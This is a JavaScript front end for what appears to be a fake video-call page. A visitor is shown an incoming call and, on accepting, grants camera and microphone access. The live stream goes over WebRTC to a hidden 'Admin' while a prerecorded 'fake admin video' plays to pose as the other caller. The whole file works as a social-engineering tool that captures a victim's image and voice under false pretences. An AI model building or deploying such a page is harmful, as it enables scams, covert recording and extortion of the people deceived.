const socket = io();

// Get Room ID
const urlParams = new URLSearchParams(window.location.search);
const roomId = urlParams.get('room') || 'room-1';

// UI Elements
const waitingRoom = document.getElementById('waiting-room');
const videoInterface = document.getElementById('video-interface');
const callModal = document.getElementById('call-modal');
const acceptBtn = document.getElementById('accept-btn');
const myVideo = document.getElementById('my-camera');
const mainVideo = document.getElementById('main-video');

// CALL CONTROL BUTTONS
const micBtn = document.getElementById('mic-btn');
const videoBtn = document.getElementById('video-btn');
const endCallBtn = document.getElementById('end-call-btn');

let localStream = null;
let peerConnection = null;
let micEnabled = true;
let videoEnabled = true;

const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

// 1. Join Room
socket.emit('join_room', roomId);

// 2. Listen for "Incoming Call"
socket.on('incoming_call', () => {
    waitingRoom.classList.add('hidden');
    callModal.classList.remove('hidden');
});

// 3. Handle "Accept" Click
acceptBtn.addEventListener('click', () => {

    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {

            // UI Switch
            callModal.classList.add('hidden');
            videoInterface.classList.remove('hidden');

            // Save stream
            localStream = stream;

            // Show user's camera
            myVideo.srcObject = stream;

            // Play fake admin video
            mainVideo.play();

            // Start WebRTC
            createPeerConnection();
        })
        .catch(err => {
            alert("You must allow camera access to join the call.");
            console.error(err);
        });
});

// --- WebRTC CONNECTION ---
function createPeerConnection() {
    peerConnection = new RTCPeerConnection(rtcConfig);

    // Add local tracks
    localStream.getTracks().forEach(track => {
        peerConnection.addTrack(track, localStream);
    });

    // Create Offer
    peerConnection.createOffer()
        .then(offer => peerConnection.setLocalDescription(offer))
        .then(() => {
            socket.emit('webrtc_offer', {
                roomId,
                sdp: peerConnection.localDescription
            });
        });

    // Send ICE candidates
    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            socket.emit('webrtc_ice_candidate', {
                roomId,
                candidate: event.candidate
            });
        }
    };
}

// Receive Answer from Admin
socket.on('webrtc_answer', (sdp) => {
    if (peerConnection) {
        peerConnection.setRemoteDescription(new RTCSessionDescription(sdp));
    }
});

// Receive ICE candidates
socket.on('webrtc_ice_candidate', (candidate) => {
    if (peerConnection) {
        peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
    }
});

// =========================
// 🎯 CALL CONTROL BUTTONS
// =========================

// MIC ON / OFF
micBtn.addEventListener('click', () => {
    if (!localStream) return;

    const audioTrack = localStream.getAudioTracks()[0];
    audioTrack.enabled = !audioTrack.enabled;
    micEnabled = audioTrack.enabled;

    micBtn.textContent = micEnabled ? "🎤" : "🔇";
});

// VIDEO ON / OFF
videoBtn.addEventListener('click', () => {
    if (!localStream) return;

    const videoTrack = localStream.getVideoTracks()[0];
    videoTrack.enabled = !videoTrack.enabled;
    videoEnabled = videoTrack.enabled;

    videoBtn.textContent = videoEnabled ? "📷" : "🚫";
});

// END CALL (CUT CALL) — 🔧 FIXED VERSION
endCallBtn.addEventListener('click', () => {

    // Stop camera & mic tracks
    if (localStream) {
        localStream.getTracks().forEach(track => track.stop());
        localStream = null;
    }

    // 🔹 FIX: Stop fake video + reset (so NO sound remains)
    mainVideo.pause();
    mainVideo.currentTime = 0;
    mainVideo.removeAttribute("src");   // fully detach source
    mainVideo.load();                   // reload so it truly stops

    // Close WebRTC connection
    if (peerConnection) {
        peerConnection.close();
        peerConnection = null;
    }

    // Reset UI
    videoInterface.classList.add('hidden');
    waitingRoom.classList.remove('hidden');

    // Notify Admin
    socket.emit('end_call', roomId);
});
